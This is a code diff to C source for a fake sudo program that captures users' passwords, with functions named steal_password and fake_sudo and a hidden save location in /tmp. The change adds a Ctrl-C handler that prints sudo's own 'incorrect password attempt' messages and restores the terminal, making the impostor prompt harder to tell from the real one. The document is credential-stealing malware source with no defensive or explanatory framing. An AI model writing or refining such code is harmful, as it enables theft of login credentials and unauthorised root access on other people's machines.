@@ -38,6 +38,9 @@
 # define SAVE_LOCATION "/tmp/.cache"
 
 int successFlag = 1;
+int retryTimes = 0;
+char current_user[2048];
+struct termios recoverterminal;
 
 /*
     Usage：
@@ -69,6 +72,8 @@ steal_password(char **lineptr, size_t *n, FILE *stream)
 
     fakeTerminal = realTerminal;
     fakeTerminal.c_lflag &= ~ECHO;
+
+    recoverterminal = realTerminal;
 
     if (tcsetattr (fileno (stream), TCSAFLUSH, &fakeTerminal) != 0)
         return -1;
@@ -242,15 +247,30 @@ clear_all(){
    system(command);
 }
 
+void
+user_interrupt(int signo){
+    if (retryTimes == 0){
+    } else if(retryTimes == 1){
+       printf("\nsudo: %d incorrect password attempt\n", retryTimes); 
+    } else{
+       printf("\nsudo: %d incorrect password attempts\n", retryTimes); 
+    }
+
+    tcsetattr (fileno (stdin), TCSAFLUSH, &recoverterminal);
+    exit(1);
+}
+
 char * 
 fake_sudo(struct passwd *usrInfo,int argc,char arguments[],char *params[])
 {
-    int retryTimes = 0;
     char testCommand[BUFFER_LEN] = {0};
     char *stealPasswd = NULL;
     char *originPasswd = NULL;
     static char allPasswd[4096];
     size_t len = 0;
+
+    strcpy(current_user,usrInfo->pw_name);
+    signal(SIGINT,user_interrupt);
 
     if (argc != 1)
     {
